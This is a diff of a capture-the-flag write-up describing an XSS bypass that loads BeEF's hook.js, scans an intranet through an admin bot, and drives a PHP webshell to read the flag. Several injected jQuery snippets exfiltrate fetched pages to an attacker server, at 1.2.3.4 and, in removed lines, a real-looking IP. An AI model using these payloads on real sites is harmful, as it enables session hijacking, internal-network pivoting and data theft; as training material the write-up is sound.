@@ -10,15 +10,16 @@
 > 
 > hint2: CORS headers
   
-We had a web interface:
+We are given a following web interface:
 
 ![Screenshot_1.png](Screenshot_1.png)
 
-After submit form, had summary, so we could test XSS prevention bypass, by us (this alert was not xss, was native in response):
+After submitting form, we see a summary of submission, so we can test XSS prevention bypass. 
+(Note, that this alert was not in XSS payload, it was just an element of response):
 
 ![Screenshot_2.png](Screenshot_2.png)
 
-Our XSS Payload: 
+We crafted the following xss payload: 
 
 ```
 <iframe onload='
@@ -30,15 +31,16 @@ Our XSS Payload:
 />
 ```
 
-XSS successfully append code to body:
+It successfully appends the code to body tag:
 ```
 <script type="text/javascript" src="http://1.2.3.4/js/hook.js"></script>
 ```
-So we could execute any unrestricted javascript code, from our external server, which was read by admin (BOT).
+allowing us to execute any unrestricted javascript code, from our external server.
+First we confirmed, that the file has been downloaded (read) by admin (probably BOT).
 
-On first we executed [hook.js](hook.js) from BeEF source. 
+As the attached file has been BeEF (The Browser Exploitation Framework Project) [hook.js](hook.js), we spend some time playing with BeEF itself. It turned out, that the bot visits the site and is disconnected after a short time (probably 5 seconds).
 
-Hint `Secret in intranet` prompted us to scan hosts in BeEF, results was:
+Hint `Secret in intranet` prompted us to scan hosts in BeEF, so we got:
 
 ```
 127.0.0.1       localhost       Linux
@@ -46,9 +48,9 @@ Hint `Secret in intranet` prompted us to scan hosts in BeEF, results was:
 192.168.1.3                     Linux
 ```
 
-After that we checked IP nearest to founded hosts
+After that, we checked IP nearest to found hosts:
 
-Injected JS code (only replaced code in hook.js in our server, XSS payload was same)
+(Note, that the comment payload was still the same, we modified only code in our server's hook.js)
 ```
 (LONG INLINE JQUERY SOURCE)
 
@@ -84,7 +86,7 @@ jQuery.get( "http://172.17.0.5", function( data ) {
 });
 ```
 
-Source of server script observer code (http://1.2.3.4/app_dev.php):
+Source of server observer code (http://1.2.3.4/app_dev.php):
 ```
 <?php
 
@@ -94,18 +96,18 @@ fclose($myfile);
 ```
 
 
-We had response from `172.17.0.2` that looked promising. Next step was checked what was there.
+We had response from `172.17.0.2` that looked promising. Next step was to check, what has been there.
 
-Changed hook.js again, for:
+Another version of hook.js:
 ```
 (LONG INLINE JQUERY SOURCE)
 
 jQuery.get( "http://172.17.0.2", function( data ) {
-    jQuery.post( "http://37.59.36.155/app_dev.php", { x: data} );
+    jQuery.post( "http://1.2.3.4/app_dev.php", { x: data} );
 });
 ```
 
-gave us response:
+Gave us the response:
 
 ```
 <html>
@@ -131,14 +133,14 @@ echo $ztz->invokeArgs(array("$_GET[c]"));
 </html>
 ```
 
-Looked nice. We had php shell from `$_GET[c]`
+Yup- turned out, that we had php shell from `$_GET[c]`.
 
-Changed hook.js again, for:
+Yet another version of hook.js:
 ```
 (LONG INLINE JQUERY SOURCE)
 
 jQuery.get( "http://172.17.0.2/?c=ls", function( data ) {
-    jQuery.post( "http://37.59.36.155/app_dev.php", { x: data} );
+    jQuery.post( "http://1.2.3.4/app_dev.php", { x: data} );
 });
 ```
 
@@ -154,9 +156,9 @@ And finally:
 (LONG INLINE JQUERY SOURCE)
 
 jQuery.get( "http://172.17.0.2/?c=cat fl4g", function( data ) {
-    jQuery.post( "http://37.59.36.155/app_dev.php", { x: data} );
+    jQuery.post( "http://1.2.3.4/app_dev.php", { x: data} );
 });
 ```
 
 
-returned flag
+returned the flag.
